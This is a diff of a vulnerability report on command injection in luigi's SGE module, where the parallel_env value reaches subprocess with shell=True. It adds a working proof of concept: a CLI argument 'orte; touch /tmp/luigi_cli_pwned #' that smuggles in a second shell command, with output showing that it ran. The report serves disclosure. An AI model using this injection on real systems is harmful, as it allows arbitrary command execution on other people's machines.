@@ -14,7 +14,7 @@
 
 ## Summary
 
-Found a potential command injection vulnerability in luigi's SGE module. User-controlled parameters are passed to `subprocess.check_output()` with `shell=True` and no sanitization.
+This document outlines a potential command injection vulnerability in luigi's SGE module. User-controlled parameters are passed to `subprocess.check_output()` with `shell=True` and no sanitization.
 
 ---
 
@@ -131,13 +131,13 @@ python test_luigi.py MyTask --name Marcos
   
 # # Subprocess Behavior Validation
 
-Before testing Luigi's SGE integration directly, subprocess behavior was validated in isolation to confirm how `shell=True` interprets input and metacharacters.
+Before testing Luigi's SGE integration directly, subprocess behavior was validated in isolation to confirm how the usage of`shell=True` interprets input and metacharacters using the code flow of the real project.
 
 ---
 
 ## 1. Basic Command Execution
 
-Confirm that `subprocess` executes commands correctly with `shell=True`.
+First we confirm that `subprocess.check_output` actually executes commands correctly with `shell=True`.
 
 python
 
@@ -149,6 +149,7 @@ print(output.decode())
 ```
 
 **Output:**
+This shows us that the subprocess in fact does run the command
 
 ```
 hello
@@ -158,7 +159,7 @@ hello
 
 ## 2. Metacharacter Interpretation
 
-Verify that shell metacharacters (`;`) are interpreted, allowing multiple commands to chain in a single string.
+Next we verify  that shell metacharacters (`;`) are interpreted, allowing us to run a malicious extra command.
 
 python
 
@@ -170,19 +171,17 @@ print(output.decode())
 ```
 
 **Output:**
-
+Here we can see that both commands are executed and we should be able to add an extra command and have it run
 ```
 hello
 injected
 ```
 
-> Both commands executed — confirming that `shell=True` passes the string directly to `/bin/sh`, which interprets `;` as a command separator.
-
 ---
 
 ## 3. Simulated Injection via Luigi-Style Code Structure
 
-Using the same pattern as Luigi's SGE task runner, a malicious value is injected into the `-pe` (parallel environment) argument to test whether it breaks out of the intended command.
+Next we use the same pattern as Luigi's SGE task runner, where we inject a malicious value into the `-pe` (parallel environment) argument to see if it breaks out and runs the command we provided.
 
 python
 
@@ -204,10 +203,76 @@ echo job | qsub -pe orte; echo Injected 4
 ```
 
 **Output:**
-
+Here we can see that the command was successfully run and Injected was printed to the console. 
 ```
 /bin/sh: 1: qsub: not found
 Injected 4
 ```
 
-> The injected `echo Injected` ran successfully as a separate shell command. Even though `qsub` was not found, the shell continued past the `;` and executed the injected payload — demonstrating a **command injection vulnerability** when unsanitized input is passed to `subprocess` with `shell=True`.
+---
+
+# Proof of Concept
+
+With subprocess behavior confirmed, the next step was to test against Luigi's actual code and not a simulation.
+
+## End-to-End via Luigi CLI
+
+A developer writes a normal `SGEJobTask` subclass. An attacker passes `--parallel-env` on the command line.
+
+Below is shown howLuigi builds the qsub command inside `_build_qsub_command()` using `str.format()`:
+
+```python
+qsub_template = """echo {cmd} | qsub -o ":{outfile}" -e ":{errfile}" -V -r y -pe {pe} {n_cpu} -N {job_name}"""
+return qsub_template.format(..., pe=pe, ...)
+```
+
+Whatever is in `parallel_env` gets placed into `-pe {pe}` with no validation. The result is passed to `subprocess.check_output(submit_cmd, shell=True)` which is a dangerous function that can lead to arbitrary code execution. 
+
+**Normal command (parallel_env='orte'):**
+Below is an example of normal usage
+```
+echo python runner.py /tmp/task | qsub -o ":/tmp/task/job.out" -e ":/tmp/task/job.err" -V -r y -pe orte 2 -N VulnerableTask
+```
+**Task script (`test_scripts/test_sge_cli.py`):**
+Below is a basic script for an SGE Task.
+```python
+class VulnerableTask(SGEJobTask):
+    def work(self): pass
+    def output(self): return luigi.LocalTarget('/tmp/vulnerable_task_output')
+```
+
+**CLI invocation with injected parameter:**
+Below is shown ab example malicous inject where a file is created in the /tmp directory through the luigi script.
+```bash
+python3 test_sge_cli.py VulnerableTask \
+    --parallel-env 'orte; touch /tmp/luigi_cli_pwned #' \
+    --local-scheduler
+```
+
+The `;` terminates the `qsub` call early. `touch /tmp/luigi_cli_pwned` runs as a separate shell command. The `#` comments out the remaining arguments (`2 -N VulnerableTask`).
+
+**Full output:**
+```
+INFO: [pid 18066] Worker ... running   VulnerableTask()
+DEBUG: qsub command:
+echo python .../sge_runner.py "/tmp/tmpb8vqr606" "..." | qsub -o ":/tmp/tmpb8vqr606/job.out" -e ":/tmp/tmpb8vqr606/job.err" -V -r y -pe orte; touch /tmp/luigi_cli_pwned # 2 -N VulnerableTask
+/bin/sh: 1: qsub: not found
+ERROR: [pid 18066] Worker ... failed    VulnerableTask()
+Traceback (most recent call last):
+  File ".../sge.py", line 257, in run
+    self._run_job()
+  File ".../sge.py", line 304, in _run_job
+    self.job_id = _parse_qsub_job_id(output)
+IndexError: list index out of range
+
+===== Luigi Execution Summary =====
+* 1 failed:
+    - 1 VulnerableTask(...)
+```
+
+```bash
+$ ls /tmp/luigi_cli_pwned
+/tmp/luigi_cli_pwned   ← proof file created by the injected command
+```
+
+The output confirms that the payload executed despite Luigi reporting the task as failed.
